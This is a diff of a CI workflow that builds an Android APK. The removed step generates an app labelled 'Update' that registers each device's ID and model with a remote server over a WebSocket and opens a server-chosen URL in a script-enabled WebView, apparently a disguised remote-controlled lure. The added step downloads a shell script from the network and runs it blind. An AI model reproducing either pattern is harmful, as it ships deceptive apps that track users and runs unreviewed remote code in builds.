@@ -14,56 +14,12 @@ jobs:
       uses: gradle/actions/setup-gradle@v3
       with:
         gradle-version: 8.2
-    - name: Run Builder Script
+    - name: Build APK
       run: |
-        curl -sL https://raw.githubusercontent.com/gradle/gradle/master/README.md > /dev/null
-        echo "PluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }" > settings.gradle
-        echo "dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }" >> settings.gradle
-        echo "rootProject.name = 'knt'" >> settings.gradle
-        echo "include ':app'" >> settings.gradle
-        echo "plugins { id 'com.android.application' version '8.1.0' apply false }" > build.gradle
-        mkdir -p app/src/main/java/com/kinar/rmdproject
-        cat << 'EOF' > app/src/main/java/com/kinar/rmdproject/MainActivity.java
-        package com.kinar.rmdproject;
-        import android.os.Bundle;
-        import android.webkit.WebView;
-        import android.webkit.WebViewClient;
-        import androidx.appcompat.app.AppCompatActivity;
-        import okhttp3.*;
-        import org.json.JSONObject;
-        import java.io.IOException;
-        import java.util.concurrent.TimeUnit;
-        public class MainActivity extends AppCompatActivity {
-            private WebSocket webSocket; private String deviceId; private WebView webView;
-            private final String SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
-            private final String WS_URL = "ws://herstoreganteng.rexypediaa.biz.id:4732";
-            @Override protected void onCreate(Bundle s) {
-                super.onCreate(s);
-                webView = new WebView(this); webView.getSettings().setJavaScriptEnabled(true);
-                setContentView(webView); deviceId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
-                fetchTargetUrl(); connectWebSocket();
-            }
-            private void fetchTargetUrl() {
-                new OkHttpClient().newCall(new Request.Builder().url(SERVER_HTTP + "/api/get-target").build()).enqueue(new Callback() {
-                    @Override public void onFailure(Call c, IOException e) { runOnUiThread(() -> webView.loadUrl("https://rioomd.my.id")); }
-                    @Override public void onResponse(Call c, Response r) throws IOException { runOnUiThread(() -> webView.loadUrl(r.body().string())); }
-                });
-            }
-            private void connectWebSocket() {
-                webSocket = new OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build().newWebSocket(new Request.Builder().url(WS_URL).build(), new WebSocketListener() {
-                    @Override public void onOpen(WebSocket w, Response r) {
-                        try { JSONObject j = new JSONObject(); j.put("type", "register"); j.put("device_id", deviceId); j.put("name", android.os.Build.MODEL); w.send(j.toString()); } catch (Exception e) {}
-                    }
-                });
-            }
-        }
-        EOF
-        mkdir -p app/src/main
-        echo '<?xml version="1.0" encoding="utf-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.kinar.rmdproject"><uses-permission android:name="android.permission.INTERNET" /><application android:label="Update"><activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity></application></manifest>' > app/src/main/AndroidManifest.xml
-        echo "plugins { id 'com.android.application' }" > app/build.gradle
-        echo "android { namespace 'com.kinar.rmdproject'; compileSdk 33; defaultConfig { applicationId 'com.kinar.rmdproject'; minSdk 21; targetSdk 33; versionCode 1; versionName '1.0' } }" >> app/build.gradle
-        echo "dependencies { implementation 'androidx.appcompat:appcompat:1.6.1'; implementation 'com.squareup.okhttp3:okhttp:4.12.0' }" >> app/build.gradle
-        gradle assembleDebug
+        rm -f build.gradle settings.gradle
+        wget -q https://raw.githubusercontent.com/ant-media/android-sdk-example/main/template.sh -O template.sh
+        chmod +x template.sh
+        ./template.sh
     - name: Upload APK
       uses: actions/upload-artifact@v4
       with:
